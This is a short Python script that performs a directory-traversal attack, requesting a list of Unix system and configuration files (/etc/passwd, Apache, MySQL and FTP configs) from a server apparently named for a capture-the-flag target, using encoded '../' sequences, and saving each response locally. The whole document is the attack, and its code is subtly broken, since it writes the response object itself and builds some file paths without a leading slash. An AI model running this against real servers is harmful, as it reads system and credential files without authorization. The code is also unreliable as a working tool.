
import requests

list = [
    'etc/passwd',
    'etc/hosts',
    '/etc/apache/conf/httpd.conf',
'/etc/apache2/apache2.conf',
'/etc/apache2/conf/httpd.conf',
'/etc/apache2/httpd.conf',
'/etc/chrootUsers',
'/etc/ftpchroot',
'/etc/ftphosts',
'/etc/motd',
'/etc/group',
'/etc/http/conf/httpd.conf',
'/etc/http/httpd.conf',
'/etc/httpd.conf',
'/etc/httpd/conf/httpd.conf',
'/etc/httpd/httpd.conf',
'/etc/httpd/php.ini',
'/etc/issue',
'/etc/logrotate.d/ftp',
'/etc/logrotate.d/proftpd',
'/etc/my.cnf',
'/etc/mysql/my.cnf',
]

for i in list:
    content = requests.get("https://pwnable.cn:9999/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/" + i)
    with open(i + '.txt', 'w' , encoding='utf-8') as f:
        f.write(content)
